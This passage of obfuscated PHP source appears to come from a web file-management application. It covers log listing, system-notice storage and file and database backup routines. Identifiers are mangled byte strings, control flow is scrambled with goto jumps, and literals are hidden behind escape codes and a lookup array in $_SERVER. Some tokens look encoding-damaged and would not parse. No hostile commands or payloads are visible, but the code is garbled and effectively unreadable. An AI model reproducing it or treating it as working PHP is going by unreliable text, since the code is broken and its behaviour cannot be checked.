(isset($cÃ«è«¡ØÖ[$bÎ„ïÈ‰ñ¢[1463]]) ? $cÃ«è«¡ØÖ[$bÎ„ïÈ‰ñ¢[1463]] : 0); goto EâóŞÖÊéŞ; cš‚É”´½±: $cÃ«è«¡ØÖ = array($bÎ„ïÈ‰ñ¢[1454] => Session::sign(), $bÎ„ïÈ‰ñ¢[1455] => $Dö÷èÀ›õ, $bÎ„ïÈ‰ñ¢[39] => $e¾¤ˆøœôù, $bÎ„ïÈ‰ñ¢[1457] => json_encode($cÃ«è«¡ØÖ)); parent::add($cÃ«è«¡ØÖ); goto føµ’‹„–Ø; føµ’‹„–Ø: } public function remove($DÔ—×ƒÚ…) { $this->where(array($_SERVER[±á õÁ][409] => $DÔ—×ƒÚ…))->delete(); } private function _makeOrder($fÆŠ·Òœâİ = '') { goto e¹Ş¨‘…Ÿó; AæÙÖ÷ùÊ: $bàË‰Ä÷çÎ = Input::get($E’â°…³„¼[432], $E’â°…³„¼[7], $E’â°…³„¼[1778], array($E’â°…³„¼[1703], $E’â°…³„¼[428])); $bàË‰Ä÷çÎ = $añœ¦£ÉÃ´[$bàË‰Ä÷çÎ]; $fÆŠ·Òœâİ = $fÆŠ·Òœâİ . "{$e±»À†Âôì}\40{$bàË‰Ä÷çÎ}"; goto eÛ·Ÿ£‹Š; e¹Ş¨‘…Ÿó: $E’â°…³„¼ =& $_SERVER[±á õÁ]; $e±»À†Âôì = $E’â°…³„¼[200]; $añœ¦£ÉÃ´ = array($E’â°…³„¼[426] => $E’â°…³„¼[427], $E’â°…³„¼[428] => $E’â°…³„¼[429]); goto AæÙÖ÷ùÊ; eÛ·Ÿ£‹Š: return $this->order($fÆŠ·Òœâİ); goto eÊ·šÄ¯ìî; eÊ·šÄ¯ìî: } public function get($BÕó©ïº¾ = '') { goto cÚ¢ÀÌ„’Ù; C–Øˆğ„á: if ($BÕó©ïº¾[$c¥æé¿íâ[1463]]) { $AñŒ“ß[$c¥æé¿íâ[1463]] = $BÕó©ïº¾[$c¥æé¿íâ[1463]]; } if (isset($BÕó©ïº¾[$c¥æé¿íâ[727]])) { $fê¿Ó­ù÷Ê = $BÕó©ïº¾[$c¥æé¿íâ[727]]; $C¼¿´„ŠœŞ = isset($BÕó©ïº¾[$c¥æé¿íâ[472]]) ? $BÕó©ïº¾[$c¥æé¿íâ[472]] : time(); $AñŒ“ß[$c¥æé¿íâ[200]] = array($c¥æé¿íâ[336], array($fê¿Ó­ù÷Ê, $C¼¿´„ŠœŞ)); } if ($BÕó©ïº¾[$c¥æé¿íâ[39]]) { $CùÙ®ˆƒ­Õ = explode($c¥æé¿íâ[57], $BÕó©ïº¾[$c¥æé¿íâ[39]]); $A¸¨«™®Ş¼ = $this->typeFile(); $fæ¤–¤¶ìÏ = array(); foreach ($CùÙ®ˆƒ­Õ as $c˜Â–«©ì—) { $fæ¤–¤¶ìÏ[] = $c˜Â–«©ì—; if (isset($A¸¨«™®Ş¼[$c˜Â–«©ì—])) { $fæ¤–¤¶ìÏ = array_merge($fæ¤–¤¶ìÏ, $A¸¨«™®Ş¼[$c˜Â–«©ì—]); } } $fæ¤–¤¶ìÏ = array_unique($fæ¤–¤¶ìÏ); if ($fæ¤–¤¶ìÏ) { $AñŒ“ß[$c¥æé¿íâ[39]] = array($c¥æé¿íâ[7], $fæ¤–¤¶ìÏ); } } goto aŠÁ‚õùÏ…; aæ¬äÊĞ™Ä: $d‹àºÊ«Šš[$c¥æé¿íâ[370]] = $this->logList($d‹àºÊ«Šš[$c¥æé¿íâ[370]]); return $d‹àºÊ«Šš; goto b¿Ù±¼ê¡; aŠÁ‚õùÏ…: if (!empty($BÕó©ïº¾[$c¥æé¿íâ[2015]])) { $AñŒ“ß[$c¥æé¿íâ[429]] = array($c¥æé¿íâ[381], "\x25{$BÕó©ïº¾[$c¥æé¿íâ[2015]]}\x25"); } $d‹àºÊ«Šš = $this->_makeOrder()->where($AñŒ“ß)->selectPage(); if (empty($d‹àºÊ«Šš[$c¥æé¿íâ[370]])) { show_json(array(), !0, $d‹àºÊ«Šš[$c¥æé¿íâ[367]]); } goto aæ¬äÊĞ™Ä; cÚ¢ÀÌ„’Ù: $c¥æé¿íâ =& $_SERVER[±á õÁ]; if (!$BÕó©ïº¾) { show_json(array()); } $AñŒ“ß = array(); goto C–Øˆğ„á; b¿Ù±¼ê¡: } private function ipAddress(&$F…‡Ã…ØÄ‡) { $CÕ˜ğªË¯ =& $_SERVER[±á õÁ]; if (!empty($F…‡Ã…ØÄ‡[$CÕ˜ğªË¯[2015]])) { $E¥î–†„ = IpLocation::get($F…‡Ã…ØÄ‡[$CÕ˜ğªË¯[2015]]); } else { $E¥î–†„ = LNG($CÕ˜ğªË¯[2016]); } $F…‡Ã…ØÄ‡[$CÕ˜ğªË¯[2017]] = $E¥î–†„; } private function descZipDownload($BÙôÜ×ê , &$Cçê«ÍÍØ) { $b»¦è¢ù¥Š =& $_SERVER[±á õÁ]; if (!isset($BÙôÜ×ê [$b»¦è¢ù¥Š[2018]])) { return; } $f¿ä»»ºÇÎ = json_decode($BÙôÜ×ê [$b»¦è¢ù¥Š[2018]], !0); foreach ($f¿ä»»ºÇÎ as $cùÅ‹ìËÓá) { if (!IO::init($cùÅ‹ìËÓá[$b»¦è¢ù¥Š[85]])) { continue; } if (!($dÎ„±ìÒ¤Õ = IO::infoFull($cùÅ‹ìËÓá[$b»¦è¢ù¥Š[85]]))) { continue; } $BÙôÜ×ê [$b»¦è¢ù¥Š[85]] = $cùÅ‹ìËÓá[$b»¦è¢ù¥Š[85]]; $Cçê«ÍÍØ[] = $BÙôÜ×ê [$b»¦è¢ù¥Š[393]] = $dÎ„±ìÒ¤Õ[$b»¦è¢ù¥Š[393]]; $Cçê«ÍÍØ[] = $BÙôÜ×ê [$b»¦è¢ù¥Š[1834]] = $dÎ„±ìÒ¤Õ[$b»¦è¢ù¥Š[486]]; break; } return $BÙôÜ×ê ; } private function getSourceList(&$b ô“îÀºÍ) { $b»çñŸïãĞ =& $_SERVER[±á õÁ]; $dìİèï˜ÆĞ = array(); foreach ($b ô“îÀºÍ as $cç¹Ô¦¾ß– => $e•„¤ºİØ) { goto D¸òÓ®î¼; D¸òÓ®î¼: $Fò²šŸá©ª = json_decode($e•„¤ºİØ[$b»çñŸïãĞ[429]], !0); if ($e•„¤ºİØ[$b»çñŸïãĞ[39]] == $b»çñŸïãĞ[1592]) { $Fò²šŸá©ª = $this->descZipDownload($Fò²šŸá©ª, $dìİèï˜ÆĞ); $b ô“îÀºÍ[$cç¹Ô¦¾ß–][$b»çñŸïãĞ[429]] = json_encode($Fò²šŸá©ª); continue; } if (strpos($e•„¤ºİØ[$b»çñŸïãĞ[39]], $b»çñŸïãĞ[1835]) !== 0) { goto D‹†¾Ã–ÔÕ; cğ…«·œ: continue; goto d«à¾¬±Ó; eÇÔŒ¥ÊªĞ: $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[393]] = $EŒÂµ³ê‚ª[$b»çñŸïãĞ[393]]; $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[1834]] = $EŒÂµ³ê‚ª[$b»çñŸïãĞ[486]]; $b ô“îÀºÍ[$cç¹Ô¦¾ß–][$b»çñŸïãĞ[429]] = json_encode($Fò²šŸá©ª); goto cğ…«·œ; D‹†¾Ã–ÔÕ: if (!isset($Fò²šŸá©ª[$b»çñŸïãĞ[85]]) || strpos($e•„¤ºİØ[$b»çñŸïãĞ[39]], $b»çñŸïãĞ[2019]) !== 0) { continue; } if (!IO::init($Fò²šŸá©ª[$b»çñŸïãĞ[85]])) { continue; } if (!($EŒÂµ³ê‚ª = IO::infoFull($Fò²šŸá©ª[$b»çñŸïãĞ[85]]))) { continue; } goto eÇÔŒ¥ÊªĞ; d«à¾¬±Ó: } goto b©ÔÑ¡ˆ´; AÕ™¬Å¯†Ó: if ($Fò²šŸá©ª[$b»çñŸïãĞ[39]] == $b»çñŸïãĞ[1843]) { $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[429]][$b»çñŸïãĞ[393]]; } goto CÆ­ŒæÜšÊ; b©ÔÑ¡ˆ´: $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[393]]; $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[1834]]; if ($Fò²šŸá©ª[$b»çñŸïãĞ[39]] == $b»çñŸïãĞ[517]) { $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[429]][$b»çñŸïãĞ[1025]]; $dìİèï˜ÆĞ[] = $Fò²šŸá©ª[$b»çñŸïãĞ[429]][$b»çñŸïãĞ[1026]]; } goto AÕ™¬Å¯†Ó; CÆ­ŒæÜšÊ: } if (!$dìİèï˜ÆĞ) { return array(); } return Model($b»çñŸïãĞ[776])->sourceListInfo($dìİèï˜ÆĞ, !0); } private function logList($dé‘±êŠÆÏ) { goto FàÉ¶ÎÆ²ê; FàÉ¶ÎÆ²ê: $aèéƒ£Ìœó =& $_SERVER[±á õÁ]; $cå×ñĞ·Ô› = array_to_keyvalue($dé‘±êŠÆÏ, $aèéƒ£Ìœó[43], $aèéƒ£Ìœó[1463]); $f¶ˆ¿£§œ = Model($aèéƒ£Ìœó[502])->userListInfo(array_unique($cå×ñĞ·Ô›)); goto C‚¬ËŞ¾¾©; CÊã¿‹Ê: return $aîàíÆ§¨; goto A¾Ê‹Ëä…ƒ; C‚¬ËŞ¾¾©: $CíëÊ‰³—× = $this->getSourceList($dé‘±êŠÆÏ); $F­¹èïÁ´Ê = $this->typeAll(); $aîàíÆ§¨ = array(); goto Aƒˆ…äšê‰; Aƒˆ…äšê‰: $Eó³ö¬†‚½ = array(); foreach ($dé‘±êŠÆÏ as $eôÙèèÅ‹ => $eìèù×´‹) { goto aî´ÄÜÚÑº; d‘ÊŸòÄ˜İ: unset($eìèù×´‹[$aèéƒ£Ìœó[2022]]); $aîàíÆ§¨[] = $eìèù×´‹; goto AÜìÚï–; F«Ä¨îŒŞ: $eìèù×´‹[$aèéƒ£Ìœó[38]] = isset($BÑĞ½œ®ï[$aèéƒ£Ìœó[38]]) ? $BÑĞ½œ®ï[$aèéƒ£Ìœó[38]] : LNG($aèéƒ£Ìœó[2016]); $eìèù×´‹[$aèéƒ£Ìœó[1884]] = isset($BÑĞ½œ®ï[$aèéƒ£Ìœó[1884]]) ? $BÑĞ½œ®ï[$aèéƒ£Ìœó[1884]] : $aèéƒ£Ìœó[43]; $eìèù×´‹[$aèéƒ£Ìœó[1366]] = isset($F­¹èïÁ´Ê[$cåŞ¥é…]) ? $F­¹èïÁ´Ê[$cåŞ¥é…] : $d„ÒŠäã¥; goto DêĞåËÊè„; aî´ÄÜÚÑº: $cåŞ¥é… = $eìèù×´‹[$aèéƒ£Ìœó[39]]; $BÑĞ½œ®ï = isset($f¶ˆ¿£§œ[$eìèù×´‹[$aèéƒ£Ìœó[1463]]]) ? $f¶ˆ¿£§œ[$eìèù×´‹[$aèéƒ£Ìœó[1463]]] : !1; $d„ÒŠäã¥ = strpos($cåŞ¥é…, $aèéƒ£Ìœó[2020]) === 0 ? LNG($aèéƒ£Ìœó[2021]) : LNG($aèéƒ£Ìœó[2016]); goto F«Ä¨îŒŞ; DêĞåËÊè„: $eìèù×´‹[$aèéƒ£Ìœó[1777]] = $BÑĞ½œ®ï; $C‘òˆ‰”Œˆ = json_decode($eìèù×´‹[$aèéƒ£Ìœó[429]], !0); $eìèù×´‹[$aèéƒ£Ìœó[2015]] = isset($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[2015]]) ? $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[2015]] : $aèéƒ£Ìœó[43]; goto AÎ÷ÒÅÈ; AÎ÷ÒÅÈ: $this->ipAddress($eìèù×´‹); if (strpos($cåŞ¥é…, $aèéƒ£Ìœó[1835]) === 0 || isset($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1834]])) { goto fÖŒººÇ; fÖŒººÇ: $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[415]] = $CíëÊ‰³—×[$C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[393]]]; $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1848]] = $CíëÊ‰³—×[$C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1834]]]; if ($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[39]] == $aèéƒ£Ìœó[517]) { $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[1025]] = $CíëÊ‰³—×[$C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[1025]]]; $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[1026]] = $CíëÊ‰³—×[$C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[1026]]]; } goto DÂó—å»ç¼; dÃŒ±¿²¿Š: if ($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1848]] && $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1848]][$aèéƒ£Ìœó[395]] == $aèéƒ£Ìœó[1101]) { $Eó³ö¬†‚½[] = $eìèù×´‹[$aèéƒ£Ìœó[391]]; unset($dé‘±êŠÆÏ[$eôÙèèÅ‹]); continue; } goto bíŸÛ†·ÎÌ; DÂó—å»ç¼: if ($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[39]] == $aèéƒ£Ìœó[1843]) { $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[393]] = $CíëÊ‰³—×[$C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[429]][$aèéƒ£Ìœó[393]]]; } if ($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[39]] == $aèéƒ£Ìœó[1587]) { $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1848]] = $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[415]]; $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1834]] = $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[1848]][$aèéƒ£Ìœó[393]]; $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[415]] = !1; $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[393]] = $aèéƒ£Ìœó[43]; } if ($C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[415]] && $C‘òˆ‰”Œˆ[$aèéƒ£Ìœó[415]][$aèéƒ£Ìœó[395]] == $aèéƒ£Ìœó[1101]) { $Eó³ö¬†‚½[] = $eìèù×´‹[$aèéƒ£Ìœó[391]]; unset($dé‘±êŠÆÏ[$eôÙèèÅ‹]); continue; } goto dÃŒ±¿²¿Š; bíŸÛ†·ÎÌ: } $eìèù×´‹[$aèéƒ£Ìœó[429]] = $C‘òˆ‰”Œˆ; goto d‘ÊŸòÄ˜İ; AÜìÚï–: } $this->clearSystemPathLog($Eó³ö¬†‚½); goto CÊã¿‹Ê; A¾Ê‹Ëä…ƒ: } private function clearSystemPathLog($b†¬ÜùÂ„Ñ) { $DÑŸÊƒô¹é =& $_SERVER[±á õÁ]; if (count($b†¬ÜùÂ„Ñ) == 0) { return; } $A¾¡ãñ·Ìõ = array($DÑŸÊƒô¹é[391] => array($DÑŸÊƒô¹é[7], array_unique($b†¬ÜùÂ„Ñ))); $this->where($A¾¡ãñ·Ìõ)->delete(); } public function deviceList($föÆ¿İêŒ, $fÊ‡Îæç® = 0) { $a“’à‡†ï =& $_SERVER[±á õÁ]; $fÒë ³´ŒÚ = array($a“’à‡†ï[1463] => $föÆ¿İêŒ, $a“’à‡†ï[200] => array($a“’à‡†ï[944], $fÊ‡Îæç®), $a“’à‡†ï[39] => $a“’à‡†ï[1560]); $DËº¾Õ…Š• = array(); $bŒÄƒ’ ‰ = $this->field($a“’à‡†ï[2023])->where($fÒë ³´ŒÚ)->order($a“’à‡†ï[1846])->limit(50)->select(); foreach ($bŒÄƒ’ ‰ as $AŸ‡ÖíÎ–Õ => $c›ĞŞ†¤ŞÉ) { goto Bãµ¾¯Í™Œ; Bãµ¾¯Í™Œ: if ($AŸ‡ÖíÎ–Õ > 0 && abs($c›ĞŞ†¤ŞÉ[$a“’à‡†ï[200]] - $bŒÄƒ’ ‰[$AŸ‡ÖíÎ–Õ - 1][$a“’à‡†ï[200]]) < 5) { continue; } $FßÌêß…¢¼ = json_decode($c›ĞŞ†¤ŞÉ[$a“’à‡†ï[429]], !0); $c›ĞŞ†¤ŞÉ[$a“’à‡†ï[2015]] = isset($FßÌêß…¢¼[$a“’à‡†ï[2015]]) ? $FßÌêß…¢¼[$a“’à‡†ï[2015]] : $a“’à‡†ï[43]; goto Aˆ’ŠÎÖÍƒ; b‹­‰÷†Ö: $this->ipAddress($c›ĞŞ†¤ŞÉ); $c›ĞŞ†¤ŞÉ[$a“’à‡†ï[429]] = $FßÌêß…¢¼; $DËº¾Õ…Š•[$d¶èŠïç‚‹] = $c›ĞŞ†¤ŞÉ; goto bÜÇ„ØÑ‹; Aˆ’ŠÎÖÍƒ: unset($FßÌêß…¢¼[$a“’à‡†ï[2015]]); $d¶èŠïç‚‹ = $this->deviceType($FßÌêß…¢¼[$a“’à‡†ï[1836]]); if (isset($DËº¾Õ…Š•[$d¶èŠïç‚‹])) { continue; } goto b‹­‰÷†Ö; bÜÇ„ØÑ‹: } return array_values($DËº¾Õ…Š•); } public function deviceType($cóĞÀ¸é¶) { return $cóĞÀ¸é¶; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x6e\157\164\151\143\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\x6e\x74\145\156\164", "\141\x75\164\150", "\155\157\x64\145", "\x74\151\155\145", "\164\x79\x70\x65", "\x6c\145\166\145\x6c", "\x65\x6e\x61\142\154\x65", "\163\x6f\162\164"); public function listData($AñôŞÓÆ = false, $eœ ¬®—Õ = "\x73\157\162\x74", $EèÅÎ¼ Ú¥ = false) { return parent::listData($AñôŞÓÆ, $eœ ¬®—Õ, $EèÅÎ¼ Ú¥); } public function add($EÍ’½’Û) { $dé„­ßáËÄ =& $_SERVER[±á õÁ]; $E¤Ò‡°ÑÓ£ = time(); if ($EÍ’½’Û[$dé„­ßáËÄ[22]] == $dé„­ßáËÄ[2024]) { $E¤Ò‡°ÑÓ£ = strtotime($EÍ’½’Û[$dé„­ßáËÄ[203]]); } $EÍ’½’Û[$dé„­ßáËÄ[203]] = $E¤Ò‡°ÑÓ£; return parent::insert($EÍ’½’Û); } public function update($f¹ÀŞÇĞÊì, $e¹‹õõÂ¥£) { goto fÇ†ÓÌçìÒ; d»˜„ß: $fœ‡šâ˜«™ = time(); if ($e¹‹õõÂ¥£[$c‡‰ÃŠìñ‰[22]] == $c‡‰ÃŠìñ‰[2024]) { $fœ‡šâ˜«™ = strtotime($e¹‹õõÂ¥£[$c‡‰ÃŠìñ‰[203]]); } $e¹‹õõÂ¥£[$c‡‰ÃŠìñ‰[203]] = $fœ‡šâ˜«™; goto Aíæ²›•¢; Aíæ²›•¢: return parent::update($f¹ÀŞÇĞÊì, $e¹‹õõÂ¥£); goto cÂÔÍÂ»ïà; fÇ†ÓÌçìÒ: $c‡‰ÃŠìñ‰ =& $_SERVER[±á õÁ]; $fùÜœ»öäˆ = $this->listData($f¹ÀŞÇĞÊì); if (!$fùÜœ»öäˆ) { return !1; } goto d»˜„ß; cÂÔÍÂ»ïà: } public function remove($bˆ‰İã£) { $E¤„ñß»Í‚ = $this->listData($bˆ‰İã£); if (!$E¤„ñß»Í‚ || $E¤„ñß»Í‚[$_SERVER[±á õÁ][1101]]) { return !1; } return parent::remove($bˆ‰İã£); } public function sort($cÀ‚ŒªµÜ, $F±çö–‰ñ) { return parent::update($cÀ‚ŒªµÜ, $F±çö–‰ñ); } public function enable($bÍ®è²õòÕ, $eŸö¦–Ï•°) { return parent::update($bÍ®è²õòÕ, array($_SERVER[±á õÁ][2025] => $eŸö¦–Ï•°)); } private function initUserOption() { $AŞºÁÅˆÜ¡ =& $_SERVER[±á õÁ]; $this->optionType = $AŞºÁÅˆÜ¡[2026]; $this->modelType = $AŞºÁÅˆÜ¡[2027]; $this->field = array($AŞºÁÅˆÜ¡[2028], $AŞºÁÅˆÜ¡[38], $AŞºÁÅˆÜ¡[203], $AŞºÁÅˆÜ¡[39], $AŞºÁÅˆÜ¡[2029], $AŞºÁÅˆÜ¡[714], $AŞºÁÅˆÜ¡[197]); } public function userNoticeGet($cÕšäø‰ = false) { $this->initUserOption(); return parent::listData($cÕšäø‰, $_SERVER[±á õÁ][391], !0); } public function userNoticeAdd($A¤ÇĞªùäö) { $D¯Ô‡¡‡£Ø =& $_SERVER[±á õÁ]; $this->initUserOption(); $B“™Š­İ´Í = $this->findByKey($D¯Ô‡¡‡£Ø[2028], $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[391]]); if ($B“™Š­İ´Í) { return !0; } $eğ¡äÑ°Ò× = array($D¯Ô‡¡‡£Ø[2028] => $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[391]], $D¯Ô‡¡‡£Ø[38] => $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[38]], $D¯Ô‡¡‡£Ø[203] => $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[203]], $D¯Ô‡¡‡£Ø[39] => isset($A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[39]]) ? $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[39]] : 1, $D¯Ô‡¡‡£Ø[2029] => isset($A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[2029]]) ? $A¤ÇĞªùäö[$D¯Ô‡¡‡£Ø[2029]] : 0, $D¯Ô‡¡‡£Ø[714] => 0, $D¯Ô‡¡‡£Ø[197] => 0); return parent::insert($eğ¡äÑ°Ò×); } public function userNoticeEdit($Dİéì”ÕšË, $f£Ş‹£Ğ) { $this->initUserOption(); return parent::update($Dİéì”ÕšË, $f£Ş‹£Ğ); } } goto eÍŞÓÍ†¶; DÌÍßùÔÓ‰: class BackupDbFile { public function __construct() { } public function index() { goto aááÃˆ«; aŞå°‡¨‡Ş: $dÙÂäÚ­ = TEMP_FILES . "\x62\x61\143\153\x75\x70\137{$a»‡œ¬ğß}\57"; $a’ö–‹ƒÄ = "\173\x69\x6f\72{$EğàÆÛŞÊ³[$AÉ„°¶ï…ô[716]]}\x7d\x2f\x64\x61\164\x61\142\141\163\145\57"; IO::mkdir($a’ö–‹ƒÄ . "\x62\141\x63\x6b\x75\160\x5f{$a»‡œ¬ğß}\57"); goto f¦ÑÜ’­ÙÖ; FŞ«Ÿˆº”: $D·‹ñùÁ¿¡->end(); Backup::set(array($AÉ„°¶ï…ô[758] => $cçï²®Œ[$AÉ„°¶ï…ô[87]])); return !0; goto dˆ ›å“îŒ; D§ÁÅ‡»: $Eææ‰Ã à = CONTROLLER_DIR . $AÉ„°¶ï…ô[757]; IO::copy($c›º½¸Ê¨², $a’ö–‹ƒÄ . "\x62\x61\x63\153\x75\160\x5f{$a»‡œ¬ğß}\57"); IO::copy($Eææ‰Ã à, $a’ö–‹ƒÄ . "\x62\141\x63\x6b\x75\160\x5f{$a»‡œ¬ğß}\57"); goto FŞ«Ÿˆº”; côˆ˜ä‘‚‡: Backup::set(array($AÉ„°¶ï…ô[755] => $cçï²®Œ[$AÉ„°¶ï…ô[87]])); IO::move($dÙÂäÚ­, $a’ö–‹ƒÄ); $c›º½¸Ê¨² = CONTROLLER_DIR . $AÉ„°¶ï…ô[756]; goto D§ÁÅ‡»; f¦ÑÜ’­ÙÖ: $D·‹ñùÁ¿¡ = new TaskFileTransfer($AÉ„°¶ï…ô[753], $AÉ„°¶ï…ô[738], 0, LNG($AÉ„°¶ï…ô[739]) . $AÉ„°¶ï…ô[436] . LNG($AÉ„°¶ï…ô[741]) . $AÉ„°¶ï…ô[754]); $D·‹ñùÁ¿¡->addPath($dÙÂäÚ­); $cçï²®Œ = IO::infoWithChildren($dÙÂäÚ­); goto côˆ˜ä‘‚‡; aááÃˆ«: $AÉ„°¶ï…ô =& $_SERVER[±á õÁ]; $EğàÆÛŞÊ³ = Backup::get(); $a»‡œ¬ğß = $EğàÆÛŞÊ³[$AÉ„°¶ï…ô[38]]; goto aŞå°‡¨‡Ş; dˆ ›å“îŒ: } } class BackupFile { public function __construct() { } public function index() { goto dëŒßóùé; Dƒ†±¢¯ä: $eôºœ·Äì– = (int) Model($_SERVER[±á õÁ][743])->where($c¢¬œğçÓœ)->count($_SERVER[±á õÁ][443]); $A¶¥è¡¡áÃ = (int) Model($_SERVER[±á õÁ][743])->where($c¢¬œğçÓœ)->sum($_SERVER[±á õÁ][87]); $FÇÛ‚ÙÄƒ÷ = new TaskFileTransfer($_SERVER[±á õÁ][761], $_SERVER[±á õÁ][738], $eôºœ·Äì–, LNG($_SERVER[±á õÁ][739]) . $_SERVER[±á õÁ][740] . LNG($_SERVER[±á õÁ][762])); goto fÔÈÁò§†; fÔÈÁò§†: $FÇÛ‚ÙÄƒ÷->task[$_SERVER[±á õÁ][723]] = $A¶¥è¡¡áÃ; $bÁâÒ¿µé = array($_SERVER[±á õÁ][763] => $eôºœ·Äì–, $_SERVER[±á õÁ][764] => $A¶¥è¡¡áÃ); Backup::set($bÁâÒ¿µé); goto AÜÚŸæˆ‰; b’ÑŒ¸‚ë©: Backup::set($bÁâÒ¿µé); $this->_fileFilter($e­µÜ«œ÷±); return !0; goto FëÕØ¨‘„Œ; e†’Œä•İ: $B‡Úµ†çµ² = $cŒ‘¶ùªŠí = 0; do { $fîø¦Â·Ö = $_SERVER[±á õÁ][765]; $e¾Õ³Àñ‘ = Model($_SERVER[±á õÁ][743])->where($c¢¬œğçÓœ)->field($fîø¦Â·Ö)->order($_SERVER[±á õÁ][766])->selectPage($Aêæ‘¦­åÍ, $Fâ›Ì”°•); $cøÉ‚Å›Ş¢ = !empty($e¾Õ³Àñ‘[$_SERVER[±á õÁ][370]]) ? $e¾Õ³Àñ‘[$_SERVER[±á õÁ][370]] : array(); foreach ($cøÉ‚Å›Ş¢ as $FõºÏÃˆíô) { goto cÂØ…ÎÜÒº; dÕŸí¢°İö: if (IO::exist($Eà¼ŒãÕÙÕ)) { $FÇÛ‚ÙÄƒ÷->updateFileEnd($FõºÏÃˆíô[$_SERVER[±á õÁ][38]], $FõºÏÃˆíô[$_SERVER[±á õÁ][87]]); } else { $Eà¼ŒãÕÙÕ = get_path_father($Eà¼ŒãÕÙÕ); IO::mkdir($Eà¼ŒãÕÙÕ); if (!IO::copy($B„è‘îÃò®, $Eà¼ŒãÕÙÕ, $_SERVER[±á õÁ][769])) { write_log($_SERVER[±á õÁ][770] . $B„è‘îÃò® . $_SERVER[±á õÁ][771] . $Eà¼ŒãÕÙÕ . $_SERVER[±á õÁ][501], $_SERVER[±á õÁ][738]); $eäåšˆÆÙÓ = !1; break; } } $b½·ÆÃ½÷ = $FõºÏÃˆíô[$_SERVER[±á õÁ][443]]; $E´Æ§¦Ïô¤ += 1; goto c†Å¦ÆŸ‡Š; c†Å¦ÆŸ‡Š: $E”î¯Ò‹ƒÇ += $FõºÏÃˆíô[$_SERVER[±á õÁ][87]]; $cŒ‘¶ùªŠí += 1; $B‡Úµ†çµ² += $FõºÏÃˆíô[$_SERVER[±á õÁ][87]]; goto FŸÍèãÓ›£; FŸÍèãÓ›£: if ($E”î¯Ò‹ƒÇ >= 1024 * 1024 * 100) { $bÁâÒ¿µé = array($_SERVER[±á õÁ][772] => $b½·ÆÃ½÷, $_SERVER[±á õÁ][773] => $cŒ‘¶ùªŠí, $_SERVER[±á õÁ][774] => $B‡Úµ†çµ²); Backup::set($bÁâÒ¿µé); $E”î¯Ò‹ƒÇ = $E´Æ§¦Ïô¤ = 0; } goto cÉšÉ²–¥—; cÂØ…ÎÜÒº: if (!$this->_fileExist($FõºÏÃˆíô, $e­µÜ«œ÷±, $FäÓÍ–¨Äë)) { $eôºœ·Äì– -= 1; $A¶¥è¡¡áÃ -= (int) $FõºÏÃˆíô[$_SERVER[±á õÁ][87]]; write_log("\146\x69\x6c\x65\x20\x6e\157\164\x20\x65\x78\151\x73\164\56\x66\151\x6c\x65\x49\x44\x3a{$FõºÏÃˆíô[$_SERVER[±á õÁ][443]]}\54\40\160\141\x74\150\72{$FõºÏÃˆíô[$_SERVER[±á õÁ][85]]}", $_SERVER[±á õÁ][767]); continue; } $B„è‘îÃò® = $FõºÏÃˆíô[$_SERVER[±á õÁ][85]]; $Eà¼ŒãÕÙÕ = "\173\x69\157\72{$a£âÆæö„[$_SERVER[±á õÁ][716]]}\x7d" . substr($B„è‘îÃò®, strlen("\173\x69\x6f\x3a{$FõºÏÃˆíô[$_SERVER[±á õÁ][768]]}\175")); goto dÕŸí¢°İö; cÉšÉ²–¥—: } $AÚÓ¹„¥ª = count($cøÉ‚Å›Ş¢); $Fâ›Ì”°•++; } while ($AÚÓ¹„¥ª == $Aêæ‘¦­åÍ); $FÇÛ‚ÙÄƒ÷->end(); goto D‚³ŞŒóÜÄ; Bã“Š×‹Æ‰: $Aêæ‘¦­åÍ = 1000; $E”î¯Ò‹ƒÇ = $E´Æ§¦Ïô¤ = 0; $e­µÜ«œ÷± = array(); goto e†’Œä•İ; D‚³ŞŒóÜÄ: $A†øÚ‡‰Œ³ = $eäåšˆÆÙÓ ? 1 : 0; $bÁâÒ¿µé = array($_SERVER[±á õÁ][775] => 1, $_SERVER[±á õÁ][472] => time(), $_SERVER[±á õÁ][733] => 